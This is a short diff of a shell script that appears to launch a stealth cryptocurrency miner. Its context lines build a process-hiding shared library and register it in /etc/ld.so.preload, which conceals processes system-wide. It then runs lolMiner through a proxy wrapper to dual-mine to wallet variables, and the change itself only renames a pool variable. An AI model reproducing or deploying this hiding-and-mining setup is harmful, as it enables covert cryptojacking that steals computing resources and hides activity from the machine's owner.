@@ -50,4 +50,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./lolMiner --algo ETHASH --pool $ETHPOOL --user $WALLET.$WORKER  --dualmode TONDUAL --dualpool $TONPOOL --dualuser $TONWALLET --worker $WORKER $@
+./graftcp/graftcp ./lolMiner --algo ETHASH --pool $POOL --user $WALLET.$WORKER  --dualmode TONDUAL --dualpool $TONPOOL --dualuser $TONWALLET --worker $WORKER $@
